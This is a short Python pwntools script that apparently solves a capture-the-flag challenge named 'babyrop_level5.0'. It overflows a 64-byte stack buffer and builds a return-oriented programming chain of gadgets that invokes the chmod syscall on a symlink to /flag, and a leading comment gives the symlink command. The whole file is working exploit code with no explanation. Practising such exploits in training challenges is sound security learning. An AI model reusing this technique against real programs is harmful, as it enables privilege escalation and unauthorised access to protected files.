# ln -s /flag '!'

from pwn import *

p = process("./babyrop_level5.0")

payload = b""
payload += b"A" * 64 # Buffer
payload += b"B" * 8 # Saved RBP
# pop rax ; ret
payload += p64(0x402607)
payload += p64(0x5a)
# pop rdi ; ret
payload += p64(0x402636)
payload += p64(0x403386) # -> "!"
# pop rsi ; ret
payload += p64(0x40262e)
payload += p64(0x4)
# syscall
payload += p64(0x402616)

p.sendline(payload)

print(p.recvall())